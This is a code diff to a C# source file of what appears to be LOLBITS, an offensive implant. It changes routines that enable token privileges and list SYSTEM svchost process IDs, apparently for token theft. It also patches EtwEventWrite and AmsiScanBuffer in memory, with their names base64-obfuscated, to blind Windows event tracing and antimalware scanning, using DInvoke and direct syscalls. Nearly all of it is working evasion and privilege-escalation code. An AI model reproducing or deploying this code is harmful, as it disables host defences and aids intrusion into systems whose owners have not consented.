@@ -2,10 +2,10 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Security;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
-using LOLBITS.Protection;
 using LOLBITS.TokenManagement;
 
 
@@ -99,6 +99,19 @@ namespace LOLBITS
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);
 
+        [SuppressUnmanagedCodeSecurity]
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        public delegate int NtCreateFile(out Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle,
+                                        int desiredAccess,
+                                        ref DInvoke.Native.DELEGATES.OBJECT_ATTRIBUTES objectAttributes,
+                                        out DInvoke.Native.DELEGATES.IO_STATUS_BLOCK ioStatusBlock,
+                                        ref long allocationSize,
+                                        uint fileAttributes,
+                                        System.IO.FileShare shareAccess,
+                                        uint createDisposition,
+                                        uint createOptions,
+                                        IntPtr eaBuffer,
+                                        uint eaLength);
 
         /////////////////////////// Privileges related functions ///////////////////////////
 
@@ -114,20 +127,21 @@ namespace LOLBITS
                 {
                     var myLuid = new DInvoke.Win32.WinNT._LUID();
                     object[] lookupPrivileges = { null, privilege, myLuid };
-                    var priv = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LookupPrivilegeValue",
+                    var priv = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LookupPrivilegeValueA",
                                                                               typeof(DInvoke.Win32.DELEGATES.LookupPrivilegeValue), lookupPrivileges);
 
                     if (!priv) continue;
 
-                    DInvoke.Win32.WinNT._TOKEN_PRIVILEGES myTokenPrivileges;
+                    DInvoke.Win32.WinNT._LUID_AND_ATTRIBUTES luidAndAttributes = new DInvoke.Win32.WinNT._LUID_AND_ATTRIBUTES();
+                    luidAndAttributes.Luid = (DInvoke.Win32.WinNT._LUID)lookupPrivileges[2];
+                    luidAndAttributes.Attributes = SE_PRIVILEGE_ENABLED;
+                    DInvoke.Win32.WinNT._TOKEN_PRIVILEGES newState;
+                    newState.PrivilegeCount = 1;
+                    newState.Privileges = luidAndAttributes;
+                    DInvoke.Win32.WinNT._TOKEN_PRIVILEGES previousState = new DInvoke.Win32.WinNT._TOKEN_PRIVILEGES();
+                    uint returnLength = 0;
 
-                    myTokenPrivileges.PrivilegeCount = 1;
-                    myTokenPrivileges.Privileges = new DInvoke.Win32.WinNT._LUID_AND_ATTRIBUTES[1];
-                    myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-                    myTokenPrivileges.Privileges[0].Luid = myLuid;
-
-
-                    object[] adjustPrivileges = { handle, false, myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero };
+                    object[] adjustPrivileges = { handle, false, newState, (uint)Marshal.SizeOf(newState), previousState, returnLength };
                     DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "AdjustTokenPrivileges",
                                                               typeof(DInvoke.Win32.DELEGATES.AdjustTokenPrivileges), adjustPrivileges);
 
@@ -225,22 +239,42 @@ namespace LOLBITS
             return false;
         }
 
-        public static int getSystemPID(SysCallManager sysCall)
+        public static List<int> getSystemPID(SysCallManager sysCall)
         {
-            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^15:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
-            string pid = ExecuteCommand(cmd, sysCall);
-            string[] spl = pid.Split('\n');
+            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr/n ^^|@ findstr /b \"^iii:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
+            string h = "";
+            bool cont = true;
+            int i = 1;
+            List<int> l = new List<int>();
 
-            return int.Parse(spl[2]);
+            while (cont){
+                h = cmd.Replace("iii", i.ToString());
+                string pid = ExecuteCommand(h, sysCall);
+                if (pid.Contains("ERR"))
+                    cont = false;
+                else
+                {
+                    string[] spl = pid.Split('\n');
+                    try
+                    {
+                        l.Add(int.Parse(spl[2]));
+                    }
+                    catch { }
+                    ++i;
+                }
+            }
+
+            l.Sort();
+            l.Reverse();
+            return l;
         }
 
-        public static bool handleETW(SysCallManager sysCall, HookManager hookManager)
+        public static bool handleETW(SysCallManager sysCall)
         {
             
             var hook = new byte[] { 0xc3 };
             uint oldProtect = 0, x = 0;
             var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
-            hookManager.Uninstall(); //getMappedModule may require LoadLibraryA for new modules
             sysCall.getMappedModule("C:\\Windows\\System32\\advapi32.dll"); // this saves time on further actions when trying to access advapi32 functions
             DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
             object[] loadLibrary = { "ntdll.dll" };
@@ -248,7 +282,6 @@ namespace LOLBITS
             
             IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", 
                                                                                       typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
-            hookManager.Install();
 
             object[] procAddress = {libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("RXR3RXZlbnRXcml0ZQ=="))};
 
@@ -287,7 +320,7 @@ namespace LOLBITS
             return true;
         }
 
-        public static bool handleAM(SysCallManager sysCall, HookManager hookManager)
+        public static bool handleAM(SysCallManager sysCall)
         {
 
             var hook = new byte[] { 0xB8,0x57,0x00,0x07,0x80,0xC3 };
@@ -296,11 +329,9 @@ namespace LOLBITS
 
             DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
             object[] loadLibrary = { Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")) };
-            hookManager.Uninstall();
 
             IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA",
                                                                                       typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
-            hookManager.Install();
 
             object[] procAddress = { libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="))};
 
